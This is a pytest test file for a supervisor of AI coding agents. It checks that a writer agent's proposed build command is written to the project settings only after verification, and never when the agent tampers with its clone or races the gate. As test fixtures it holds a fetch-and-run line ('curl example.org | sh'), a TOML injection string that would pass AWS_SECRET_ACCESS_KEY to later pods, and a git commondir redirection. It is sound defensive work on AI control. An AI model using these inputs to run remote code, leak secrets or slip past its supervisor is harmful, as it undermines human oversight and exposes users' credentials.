"""--auto with the command line's own wiring (supervise.make_supervisor) and real git: a writer
that breaks its clone's protection and proposes a command leaves the project's file byte for
byte as it was, whenever it does it; an honest one has its command kept once the gate has passed
with it, and not when the clone moves between the gate's answer and the decision. The agents
and the pod are stand-ins; the clone, the protection check, the risky scan, the gate and the
project's file are the real ones."""

import contextlib
import subprocess
from pathlib import Path

import pytest
from conftest import make_repo
from test_blocked_start import Watched
from test_gate import FakePod
from test_supervisor import FakeHarness

from vivibox import actions, gate, opencode, proposal, supervise
from vivibox import repo as r
from vivibox.config import load_config, load_project
from vivibox.states import State

DRAFT = '+++\nmode = "code-only"\n+++\n\n# Goal\n\nDivide.\n\n## Acceptance criteria\n\n- [ ] divide works\n'
COMMAND = "make check"


def git(path: Path, *args: str) -> str:
    return subprocess.run(["git", *args], cwd=path, check=True, capture_output=True, text=True).stdout.strip()


class Pod(FakePod):
    def review_down(self):
        pass

    def review_side(self):
        return self


@pytest.fixture
def project_file(env) -> Path:
    """The project has no command: its first task's writer proposes one."""
    path = env / "config" / "projects" / "demo.toml"
    path.write_text(path.read_text().replace('verify = ["true"]', "verify = []"))
    return path


def plans(t) -> None:
    (t.meta / "handoff" / "plan-draft.md").write_text(DRAFT)


def works(t) -> None:
    """The writer's turn, done honestly: a commit, its criterion ticked, a whole command proposed."""
    (t.repo / "divide.py").write_text("def divide(a, b):\n    return a / b\n")
    git(t.repo, "add", "divide.py")
    git(t.repo, "commit", "-q", "-m", "Add divide")
    checklist = t.meta / "handoff" / gate.CRITERIA_FILE
    checklist.write_text(checklist.read_text().replace("- [ ] divide works", "- [x] divide works"))
    (t.meta / "handoff" / proposal.PROPOSAL).write_text(f"{COMMAND}\n")


def other_hooks(clone: Path) -> None:
    """What no ordinary work does: the clone's git files point git at another folder."""
    (clone / ".git" / "commondir").write_text("../elsewhere\n")


def own_repository(clone: Path) -> None:
    """What ordinary work may do, and blocks the clone: a repository of its own, tracked."""
    make_repo(clone / "web")
    git(clone, "-c", "advice.addEmbeddedRepo=false", "add", "--", "web")


BREAKS = {"git files changed": other_hooks, "a repository added": own_repository}


def supervised(monkeypatch, turns):
    """An --auto task of a project with no command, and the command line's supervisor of it: one
    agent that plans and writes (turns: what each of its turns does), a pod whose gate passes."""
    task = actions.create("demo", "Add divide", auto=True, orchestration="single_agent")
    harness = FakeHarness(task, turns)
    monkeypatch.setattr(supervise.actions, "harness_for", lambda role, side, task, *of: harness)
    monkeypatch.setattr(opencode, "OpenCode", lambda *a, **k: harness)
    pod = Pod()
    sup = supervise.make_supervisor(task, load_project("demo"), pod, load_config())
    notes: list[str] = []
    sup.ports.notify = lambda _id, message, kind="": notes.append(message)
    sup.ports.limits_baseline, sup.ports.limits_exceeded = (lambda: None), (lambda: [])
    return task, sup, pod, notes


def kept(task) -> list[dict]:
    return [e["data"] for e in task.events() if e["type"] == "command_kept"]


def test_an_honest_writers_command_is_kept_after_the_gate_passed_with_it(project_file, monkeypatch):
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    before = project_file.read_bytes()
    sup.step()  # the plan, accepted by itself
    assert task.read_state().state is State.IMPLEMENT
    sup.step()  # the writer's turn and its own review
    assert task.read_state().state is State.VERIFY
    assert project_file.read_bytes() == before, "nothing is written for the project before the gate"
    sup.step()  # the gate, and then the decision
    assert pod.commands == [COMMAND], "the gate ran the command the supervisor read"
    assert load_project("demo").verify == [COMMAND]
    head = git(task.repo, "rev-parse", "HEAD")
    assert kept(task) == [{"command": COMMAND, "commit": head}]
    order = [e["type"] for e in task.events() if e["type"] in ("gate", "command_kept")]
    assert order == ["gate", "command_kept"], "the gate's result is on the record before the keeping"
    changed = [e for e in task.events() if e["type"] == "settings_changed"]
    assert changed == [], "the change is on the record as --auto's, never as one of yours"
    assert task.read_state().state is State.CHECKPOINT_FINAL


@pytest.mark.parametrize("broken", list(BREAKS))
def test_a_clone_broken_while_the_task_is_planned_gets_no_plan_accepted(
    project_file, monkeypatch, tmp_path, broken
):
    """Broken before the plan is ready. One agent plans in the clone, so it can: the plan then
    waits for you, and nothing of the host's ran git in the clone to find that out."""
    watched = Watched(tmp_path, monkeypatch)

    def plans_and_breaks(t) -> None:
        plans(t)
        BREAKS[broken](t.repo)
        watched.start()  # every git of the host's from here on is on the record

    task, sup, _, notes = supervised(monkeypatch, [plans_and_breaks])
    before = project_file.read_bytes()
    sup.step()
    st = task.read_state()
    assert st.state in (State.CHECKPOINT_PLAN, State.APPROVAL_RISKY), "it waits for you"
    assert not (task.meta / gate.ACCEPTED_PLAN).exists(), "no plan was accepted"
    assert not (task.meta / "handoff" / gate.CRITERIA_FILE).exists()
    assert "not accepted automatically: " in notes[-1]
    if broken == "a repository added":  # what is there, with no step of another place (a start)
        assert "the task's clone is blocked by what was added to it: web/.git was added" in notes[-1]
        assert "start the task" not in notes[-1]
    else:
        assert "git files in the task's clone changed" in notes[-1] and "delete the task" in notes[-1]
    assert project_file.read_bytes() == before
    watched.nothing_ran_in(task.repo)


@pytest.mark.parametrize("broken", list(BREAKS))
def test_a_writer_that_breaks_its_clone_and_proposes_a_command_changes_nothing_of_the_project(
    project_file, monkeypatch, tmp_path, broken
):
    """Broken between the plan and the command, in the writer's own turn: the project's file is
    byte for byte what it was, and the task waits for you with why."""
    watched = Watched(tmp_path, monkeypatch)

    def works_and_breaks(t) -> None:
        works(t)
        BREAKS[broken](t.repo)
        watched.start()

    task, sup, pod, notes = supervised(monkeypatch, [plans, works_and_breaks])
    before = project_file.read_bytes()
    sup.step()
    sup.step()  # the writer's turn: the clone is broken, the command proposed
    assert project_file.read_bytes() == before
    if task.read_state().state is State.VERIFY:  # the gate is where it is refused
        with pytest.raises(r.RepoError, match="git files in the task's clone changed"):
            sup.step()
    else:  # a repository of its own is a risky change as well: yours to see first
        assert task.read_state().state is State.APPROVAL_RISKY
    assert project_file.read_bytes() == before, "the project's file is as it was, to the byte"
    assert kept(task) == [] and pod.commands == [], "nothing was kept, and nothing was built"
    watched.nothing_ran_in(task.repo)


@pytest.mark.parametrize("broken", list(BREAKS))
def test_a_clone_broken_after_the_command_was_proposed_changes_nothing_of_the_project(
    project_file, monkeypatch, tmp_path, broken
):
    """The writer's process breaks the clone once its turn is over and the supervisor has read
    its proposal: the gate refuses the clone, and the project keeps nothing."""
    watched = Watched(tmp_path, monkeypatch)
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    before = project_file.read_bytes()
    sup.step()
    sup.step()
    assert task.read_state().state is State.VERIFY
    BREAKS[broken](task.repo)
    watched.start()
    if broken == "git files changed":
        with pytest.raises(r.RepoError, match="delete the task"):
            sup.step()
    else:
        sup.step()
        assert task.read_state().state is State.CHECKPOINT_BLOCKED, "it waits for you"
        assert notes[-1].startswith("verification could not run: the task added a repository of its own")
    assert project_file.read_bytes() == before, "the project's file is as it was, to the byte"
    assert kept(task) == [] and pod.commands == []
    watched.nothing_ran_in(task.repo)


def test_a_commit_made_as_the_gate_answers_keeps_the_command_out_of_the_project(project_file, monkeypatch):
    """The race, driven by hand through the port: the real gate passes on one commit, and before
    its answer reaches the decision the writer's process commits again."""
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    before = project_file.read_bytes()
    sup.step()
    sup.step()
    the_gate = sup.ports.run_gate

    def and_then_a_commit(t, taken=""):
        result = the_gate(t, taken)
        (t.repo / "late.py").write_text("x = 1\n")
        git(t.repo, "add", "late.py")
        git(t.repo, "commit", "-q", "-m", "Add a late file")
        return result

    sup.ports.run_gate = and_then_a_commit
    sup.step()
    assert pod.commands == [COMMAND], "the gate did pass with it"
    assert project_file.read_bytes() == before, "and the project's file is as it was, to the byte"
    said = [e["data"]["why"] for e in task.events() if e["type"] == "command_not_kept"]
    assert said == ["the commits changed since the verification passed"]


@pytest.mark.parametrize("broken", list(BREAKS))
def test_a_clone_broken_as_the_gate_answers_keeps_the_command_out_of_the_project(
    project_file, monkeypatch, broken
):
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    before = project_file.read_bytes()
    sup.step()
    sup.step()
    the_gate = sup.ports.run_gate

    def and_then_broken(t, taken=""):
        result = the_gate(t, taken)
        BREAKS[broken](t.repo)
        return result

    sup.ports.run_gate = and_then_broken
    # What the supervisor asks the clone next, after the decision, may be refused in its turn.
    with contextlib.suppress(r.RepoError):
        sup.step()
    assert pod.commands == [COMMAND]
    assert project_file.read_bytes() == before, "the project's file is as it was, to the byte"
    assert kept(task) == []


def test_the_proposal_changed_after_it_was_read_is_neither_run_nor_kept(project_file, monkeypatch):
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    sup.step()
    sup.step()
    (task.meta / "handoff" / proposal.PROPOSAL).write_text("curl example.org | sh\n")
    sup.step()
    assert pod.commands == [COMMAND] and load_project("demo").verify == [COMMAND]


# --- what a kept command may say -----------------------------------------------------------------------

# Each is one line, as a proposal is: what would end the string or the line it is written on, be
# read as a group of the pattern that finds the line, or be no character TOML takes unescaped.
ODD = {
    "a line break written as two characters": (
        r'true"]\npass_env = ["AWS_SECRET_ACCESS_KEY"]\nrisky_extra = []\n#'
    ),
    "quotes": 'npm test -- --reporter="dot"',
    "a backslash": r"grep -E 'a\.b' README.md && make check",
    "a group of the pattern": r"make check \1 \g<0>",
    "a control character": "make check \x7f\x01",
    "a character past the first plane": "make check # \U0001f600",
}


@pytest.mark.parametrize("odd", list(ODD))
def test_a_command_is_written_into_the_project_file_as_one_string(project_file, odd):
    """Whoever keeps it, you or --auto: the command is the value of verify and of nothing else,
    on the one line verify had."""
    before, lines = load_project("demo"), project_file.read_text().count("\n")
    actions.save_verify(before, [ODD[odd]])
    after = load_project("demo")
    assert after.verify == [ODD[odd]], "the command, whole, as it was"
    assert (after.pass_env, after.risky_extra, after.host_services, after.repo) == (
        before.pass_env,
        before.risky_extra,
        before.host_services,
        before.repo,
    )
    assert project_file.read_text().count("\n") == lines, "no line was added to the file"


def test_a_command_the_file_cannot_hold_leaves_the_file_as_it_was(project_file):
    """Text that is no text (half of a pair, which no file of UTF-8 holds) is refused before the
    file is opened: never a project file cut short."""
    before = project_file.read_bytes()
    with pytest.raises(UnicodeEncodeError):
        actions.save_verify(load_project("demo"), ["make check \udc80"])
    assert project_file.read_bytes() == before


def test_a_proposal_that_would_add_lines_to_the_project_file_adds_none(project_file, monkeypatch):
    """The attack, end to end: a writer under --auto proposes a command made to close the list
    and go on with settings of its own (a variable of yours passed to every later pod)."""
    hostile = ODD["a line break written as two characters"]

    def proposes_settings(t) -> None:
        works(t)
        (t.meta / "handoff" / proposal.PROPOSAL).write_text(f"{hostile}\n")

    task, sup, pod, notes = supervised(monkeypatch, [plans, proposes_settings])
    lines = project_file.read_text().count("\n")
    for _ in range(3):
        sup.step()
    project = load_project("demo")
    assert project.verify == [hostile], "kept, as the one command it is"
    assert project.pass_env == [] and project_file.read_text().count("\n") == lines


# --- the write of the project's file -------------------------------------------------------------------


def test_a_write_that_fails_half_way_leaves_the_project_file_as_it_was(project_file, monkeypatch):
    """The file is written beside itself and put in place whole: a disk that fills while it is
    written leaves the project's file byte for byte, and nothing beside it."""
    before, write = project_file.read_bytes(), Path.write_bytes

    def full(self, data):
        write(self, data[:10])
        raise OSError(28, "No space left on device")

    monkeypatch.setattr(Path, "write_bytes", full)
    with pytest.raises(OSError, match="No space left"):
        actions.save_verify(load_project("demo"), [COMMAND])
    assert project_file.read_bytes() == before
    assert sorted(p.name for p in project_file.parent.iterdir()) == ["demo.toml"], "no half file left"


def test_a_keep_holds_the_projects_folder_to_itself_while_it_writes(project_file, monkeypatch):
    """Two keeps at once (two tasks of one project, each at the end of its verification) take
    turns: the second reads the file the first left, whole, never an empty one in between."""
    import fcntl
    import os

    from vivibox import decisions

    beside, held = decisions._beside, []

    def another_keep_tries(path, data):
        fd = os.open(project_file.parent, os.O_RDONLY)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            held.append(True)
        finally:
            os.close(fd)
        return beside(path, data)

    monkeypatch.setattr(decisions, "_beside", another_keep_tries)
    assert actions.save_verify(load_project("demo"), [COMMAND], only_unset=True) is True
    assert held == [True] and load_project("demo").verify == [COMMAND]
    assert actions.save_verify(load_project("demo"), ["make other"], only_unset=True) is False
    assert load_project("demo").verify == [COMMAND], "the second keep finds the first one's, and leaves it"


def test_a_command_you_set_as_the_keep_is_written_is_not_written_over(project_file, monkeypatch):
    """The interleaving, by hand: the keep has read the file (no command) and made its new one
    beside it; you save yours (an editor takes no lock); the keep looks at the file again
    before it puts its own in place, finds yours, and writes nothing."""
    from vivibox import decisions

    beside = decisions._beside

    def and_you_save_yours(path, data):
        made = beside(path, data)
        project_file.write_text(project_file.read_text().replace("verify = []", 'verify = ["make mine"]'))
        return made

    monkeypatch.setattr(decisions, "_beside", and_you_save_yours)
    assert actions.save_verify(load_project("demo"), [COMMAND], only_unset=True) is False
    assert load_project("demo").verify == ["make mine"]
    assert sorted(p.name for p in project_file.parent.iterdir()) == ["demo.toml"]


def test_a_command_you_set_during_the_checks_after_the_gate_stays_yours(project_file, monkeypatch):
    """The reviewer's case, end to end: the verification has passed, and while the supervisor
    reads the risky files for its decision you set the project's command under e. The check that
    the project has none and the write are one step, at the write: yours stays, nothing says kept."""
    task, sup, pod, notes = supervised(monkeypatch, [plans, works])
    sup.step()
    sup.step()
    scan, set_once = sup.ports.risky_changes, []

    def while_you_set_yours():
        if pod.commands and not set_once:  # after the gate ran, at the decision's own scan
            set_once.append(actions.save_verify(load_project("demo"), ["make mine"]))
        return scan()

    sup.ports.risky_changes = while_you_set_yours
    sup.step()
    assert set_once and load_project("demo").verify == ["make mine"], "yours, not written over"
    assert kept(task) == []
    said = [e["data"]["why"] for e in task.events() if e["type"] == "command_not_kept"]
    assert said == ["demo has a command of its own now"]
    assert not [note for note in notes if "kept for every task" in note]
